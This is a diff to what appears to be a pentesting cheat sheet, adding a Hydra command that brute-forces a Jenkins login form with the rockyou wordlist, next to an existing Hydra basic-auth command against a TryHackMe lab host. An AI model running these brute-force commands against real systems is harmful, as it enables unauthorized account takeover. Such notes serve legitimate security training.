@@ -7,6 +7,12 @@ Hydra basic authentication syntax:
 hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/500-worst-passwords.txt enum.thm http-get /labs/basic_auth
 ```
 
+Hydra jenkins bruteforce : 
+
+```
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt target.com http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^:F=loginError"
+```
 
 ## OTP Bypass 
 OTP AUTH based bypass : #script #otp #auth
